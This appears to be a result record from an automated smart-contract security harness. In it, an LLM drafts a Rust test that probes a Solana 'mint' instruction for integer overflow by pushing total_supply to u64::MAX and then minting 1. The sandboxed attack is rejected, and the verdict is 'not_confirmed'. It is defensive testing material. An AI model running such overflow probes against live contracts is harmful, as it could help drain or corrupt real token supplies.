@@ -1,0 +1,75 @@
+{
+  "category": "MATH",
+  "verdict": "not_confirmed",
+  "exploit_successful": false,
+  "attack_result": "Failure(Custom(6000))",
+  "reason": "ataque rejeitado: Failure(Custom(6000))",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 1920,
+        "completion_tokens": 882,
+        "latency_s": 4.75
+      },
+      "raw": "{\n  \"plan\": \"Inicializamos uma conta Ledger com total_supply proximo de u64::MAX (u64::MAX - 5) usando a instrucao initialize, com a authority como signer e pagadora. O baseline chama mint com amount=5, que deve ter sucesso e levar total_supply a u64::MAX. O ataque chama mint com amount=1, que se vulneravel causaria overflow silencioso em total_supply (voltando a 0) em vez de falhar. Medimos o efeito lendo total_supply apos o ataque: se for 0 (ou menor que o valor anterior), o overflow ocorreu; se a instrucao falhar, nenhum efeito e registrado.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet ledger_key = Pubkey::new_unique();\\n\\nlet (system_id, system_acc) = system_program_account();\\n\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(u64::MAX - 5u64).to_le_bytes(),\\n    vec![\\n        AccountMeta::new(ledger_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(system_id, false),\\n    ],\\n);\\n\\nlet init_accounts = vec![\\n    (ledger_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    (system_id, system_acc),\\n];\\n\\nlet r_init = env.baseline(\\\"initialize ledger com supply quase maximo\\\", &init_ix, &init_accounts);\\n\\nlet ledger_after_init = after(&r_init, &ledger_key).clone();\\n\\nlet mint_ix = env.anchor_ix(\\n    \\\"mint\\\",\\n    &5u64.to_le_bytes(),\\n    vec![\\n        AccountMeta::new(ledger_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\n\\nlet mint_accounts = vec![\\n    (ledger_key, ledger_after_init.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet r_baseline = env.baseline(\\\"mint legitimo de 5\\\", &mint_ix, &mint_accounts);\\n\\nlet ledger_after_baseline = after(&r_baseline, &ledger_key).clone();\\n\\nlet attack_ix = env.anchor_ix(\\n    \\\"mint\\\",\\n    &1u64.to_le_bytes(),\\n    vec![\\n        AccountMeta::new(ledger_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\n\\nlet attack_accounts = vec![\\n    (ledger_key, ledger_after_baseline.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet r_attack = env.attack(\\\"mint de 1 apos supply em u64::MAX\\\", &attack_ix, &attack_accounts);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let supply_after = read_u64(after(&r_attack, &ledger_key).data(), 40);\\n    let balance_after = read_u64(after(&r_attack, &ledger_key).data(), 48);\\n    env.effect(\\n        \\\"total_supply deu a volta (overflow) em vez de falhar\\\",\\n        supply_after < u64::MAX,\\n    );\\n    env.effect(\\n        \\\"user_balance tambem sofreu overflow\\\",\\n        balance_after < u64::MAX,\\n    );\\n}\"\n}",
+      "plan": "Inicializamos uma conta Ledger com total_supply proximo de u64::MAX (u64::MAX - 5) usando a instrucao initialize, com a authority como signer e pagadora. O baseline chama mint com amount=5, que deve ter sucesso e levar total_supply a u64::MAX. O ataque chama mint com amount=1, que se vulneravel causaria overflow silencioso em total_supply (voltando a 0) em vez de falhar. Medimos o efeito lendo total_supply apos o ataque: se for 0 (ou menor que o valor anterior), o overflow ocorreu; se a instrucao falhar, nenhum efeito e registrado.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet ledger_key = Pubkey::new_unique();\n\nlet (system_id, system_acc) = system_program_account();\n\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(u64::MAX - 5u64).to_le_bytes(),\n    vec![\n        AccountMeta::new(ledger_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(system_id, false),\n    ],\n);\n\nlet init_accounts = vec![\n    (ledger_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    (system_id, system_acc),\n];\n\nlet r_init = env.baseline(\"initialize ledger com supply quase maximo\", &init_ix, &init_accounts);\n\nlet ledger_after_init = after(&r_init, &ledger_key).clone();\n\nlet mint_ix = env.anchor_ix(\n    \"mint\",\n    &5u64.to_le_bytes(),\n    vec![\n        AccountMeta::new(ledger_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\n\nlet mint_accounts = vec![\n    (ledger_key, ledger_after_init.clone()),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet r_baseline = env.baseline(\"mint legitimo de 5\", &mint_ix, &mint_accounts);\n\nlet ledger_after_baseline = after(&r_baseline, &ledger_key).clone();\n\nlet attack_ix = env.anchor_ix(\n    \"mint\",\n    &1u64.to_le_bytes(),\n    vec![\n        AccountMeta::new(ledger_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\n\nlet attack_accounts = vec![\n    (ledger_key, ledger_after_baseline.clone()),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet r_attack = env.attack(\"mint de 1 apos supply em u64::MAX\", &attack_ix, &attack_accounts);\n\nif r_attack.program_result == ProgramResult::Success {\n    let supply_after = read_u64(after(&r_attack, &ledger_key).data(), 40);\n    let balance_after = read_u64(after(&r_attack, &ledger_key).data(), 48);\n    env.effect(\n        \"total_supply deu a volta (overflow) em vez de falhar\",\n        supply_after < u64::MAX,\n    );\n    env.effect(\n        \"user_balance tambem sofreu overflow\",\n        balance_after < u64::MAX,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize ledger com supply quase maximo",
+            "result": "Success",
+            "compute_units": 5933,
+            "account_flags": "sw,sw,-r"
+          },
+          {
+            "step": "baseline",
+            "note": "mint legitimo de 5",
+            "result": "Success",
+            "compute_units": 2362,
+            "account_flags": "-w,sr"
+          },
+          {
+            "step": "attack",
+            "note": "mint de 1 apos supply em u64::MAX",
+            "result": "Failure(Custom(6000))",
+            "compute_units": 2264,
+            "account_flags": "-w,sr"
+          }
+        ],
+        "runtime_trace": [
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 5933 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 2362 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 2264 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA failed: custom program error: 0x1770"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "not_confirmed",
+      "reason": "ataque rejeitado: Failure(Custom(6000))"
+    }
+  ],
+  "case_id": "SSP-03-A-S1",
+  "static_finding": {
+    "category": "MATH",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Integer Overflow / Underflow."
+  }
+}
